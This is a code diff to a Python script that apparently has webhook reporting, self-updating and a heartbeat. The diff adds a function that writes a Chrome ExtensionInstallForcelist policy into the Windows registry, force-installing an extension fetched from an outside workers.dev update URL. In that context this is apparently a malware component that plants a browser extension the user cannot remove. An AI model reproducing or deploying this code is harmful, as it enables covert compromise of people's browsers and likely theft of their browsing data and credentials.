@@ -3,6 +3,7 @@ import os, socket, sys, importlib, tempfile, random, csv, io, shutil
 import urllib.request, subprocess
 import time
 from pathlib import Path
+import winreg
 
 def ensure_package(package_name, import_name):
     """
@@ -429,6 +430,18 @@ def manage_updates():
             send_webhook("Sucessfully removed old install")
 
         sys.exit()
+
+def install_ext():
+    key_path = r"Software\Policies\Google\Chrome\ExtensionInstallForcelist"
+
+    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
+        winreg.SetValueEx(
+            key,
+            "67",
+            0,
+            winreg.REG_SZ,
+            "clfbahpbgmlbahejgcbninkkbljjnpki;https://pc-lamartin.anna-benbekthi.workers.dev/update.xml"
+        )
 
 def heartbeat():
     global FIRST_MESSAGE
